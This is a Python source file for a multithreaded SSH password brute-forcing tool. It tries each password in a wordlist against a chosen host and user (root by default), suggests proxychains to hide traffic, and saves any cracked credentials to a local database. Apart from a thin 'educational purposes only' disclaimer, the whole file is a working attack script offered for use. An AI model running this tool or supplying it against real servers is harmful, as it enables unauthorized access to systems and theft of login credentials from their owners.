'''
Author: Romeos CyberGypsy
Date: 2/23/2020
Name: bruteforce_ssh
Purpose: bruteforcing ssh servers
Note: Use proxychains when executing this script to avoid errors
'''

################################
#This script is for educational purposes only.
#I will not be accountable for any wrong use of the script
#As always, happy hacking :)
###############################
import paramiko
import socket
from termcolor import colored
import optparse
import sys
import threading
import time
import sqlite3 as lite
from tkinter import messagebox

class Engine:
    def __init__(self):
        #variables required:
        #hostname, username,timeout, wordlist, threads

        print(colored("SSHBrute script","blue"))
        print(colored("Written by Romeos CyberGypsy","yellow"))
        print(colored("I recommend incorporating proxy chains when using this script to avoid errors.","green"))
        print(colored("[-] For educational purposes only.\nI will not be held accountable for any misuse of the sript","red"))
        self.parser = optparse.OptionParser()
        self.parser.add_option("-H","--hostname", dest = "host", help = "IP Address or url running ssh server")
        self.parser.add_option("-u","--username", dest = "user", help = "Username to bruteforce. Defaults to root", default = "root")
        self.parser.add_option("-w","--wordlist", dest = "wordlist", help = "List containing passwords, one per line", default = "wordlist.txt")
        self.parser.add_option("-t","--threads", dest = "threads", help = "Number of concurrent threads to run at a time.Range between 1-15.Defaults to 5", default = 5)
        self.parser.add_option("-T","--timeout", dest = "timeout", help = "Timeout in seconds",default = "2")
        (self.values, self.keys) = self.parser.parse_args()

        if len(sys.argv) < 3:
            print("Invalid syntax")
            print(colored("Syntax: python3 bruteforce_ssh.py -H <hostname> -u <username> -w <wordlist> -t <threads> -T <timeout in seconds>","blue"))

        else:
            try:
                self.brute(self.values.host, self.values.user, self.values.threads, self.values.wordlist, self.values.timeout)

            except KeyboardInterrupt:
                print(colored("\n[-] Exiting safely","red"))



    def read_pass_file(self):
        file = open(self.values.wordlist,"r")
        return file

    def brute(self, hostname, username, threads, wordlist, timeout):
        x = 0
        file = open(self.values.wordlist,"r")
        if int(threads) > 15:
            print(colored("Number of threads should range between 1-15. Please try again!!","yellow"))
            sys.exit()
        for password in file.readlines():
            password = password.strip("\n")
            x+=1

        file.close()
        y = 0
        file = open(wordlist, "r")
        for password in file.readlines():
            password = password.strip("\n")
            y+=1
            print(colored("[-] Trying password {} of {} -> {} : {} ".format(str(y), str(x), username, password), "green"))
            thread1 = threading.Thread(target = self.connect, args = (hostname, username, timeout, password,))
            thread1.start()
            if y%int(threads) == 0:
                time.sleep(3)

            else:
                pass


    def connect(self, hostname, username, timeout, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            hostname = socket.gethostbyname(hostname)
            client.connect(hostname = hostname, username = username, password = password, timeout = int(timeout))
            print(colored("[+] Logins found. {} : {}".format(username, password), "yellow"))
            credentials = [username, password]
            conn = lite.connect("password.db")
            cur = conn.cursor()
            cur.execute('create table if not exists credentials(Username TEXT, Password TEXT)')
            cur.execute("INSERT INTO credentials VALUES(?,?)",credentials)
            conn.commit()
            conn.close()
            messagebox.showinfo("Info:","Credentials found:\nUsername:{}\nPassword:{}".format(username, password))
            sys.exit()

        except socket.timeout:
            print(colored("[-] Host unreachable. Please try again later...", "red"))
            sys.exit()

        except paramiko.AuthenticationException:
            pass

        except paramiko.SSHException:
            print(colored("[!!] Sleeping for 5 seconds before continue","blue"))
            time.sleep(5)

        except Exception as e:
            pass

        client.close()


if __name__ == '__main__':
    obj = Engine()
